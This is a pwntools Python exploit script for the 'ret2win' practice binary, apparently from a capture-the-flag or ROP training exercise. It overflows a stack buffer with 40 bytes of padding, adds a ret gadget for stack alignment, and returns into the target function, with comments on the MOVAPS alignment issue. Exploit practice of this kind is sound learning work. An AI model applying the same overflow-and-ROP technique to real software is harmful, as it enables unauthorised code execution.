#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win

import os
os.environ['XDG_CACHE_HOME'] = '/tmp'

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win')
context.terminal = ['tmux','splitw','-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b pwnme
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# g = cyclic_gen()
# payload = g.get(100)

#pwn cyclic -l kaaa

payload = b"A" * 40

rop = ROP(exe)
# TODO fix  def __get_cachefile_name(self, files): in "/usr/local/lib/python3.6/dist-packages/pwnlib/rop/rop.py
ret_gadget = rop.ret
print(ret_gadget.address)
payload += p64(ret_gadget.address )

'''
The MOVAPS issue
If you're segfaulting on a movaps instruction in buffered_vfprintf() 
or do_system() in the x86_64 challenges, then ensure the stack is 
16-byte aligned before returning to GLIBC functions such as printf() 
or system(). Some versions of GLIBC uses movaps instructions to move 
data onto the stack in certain functions. The 64 bit calling convention 
requires the stack to be 16-byte aligned before a call instruction but 
this is easily violated during ROP chain execution, causing all further 
calls from that function to be made with a misaligned stack. movaps 
triggers a general protection fault when operating on unaligned data, 
so try padding your ROP chain with an extra ret before returning into 
a function or return further into a function to skip a push instruction.
'''

payload += p64(exe.symbols["ret2win"])

# Easter egg: in GDB, call (void) ret2win() after setting breakpoint on pwnme

#open('payload', 'wb').write(payload)

io.recvuntil(">")

io.clean()

io.sendline(payload)

io.recv(timeout = 2)
io.recv(timeout = 2)

#kill dead pane - ctrl b + x

io.interactive()

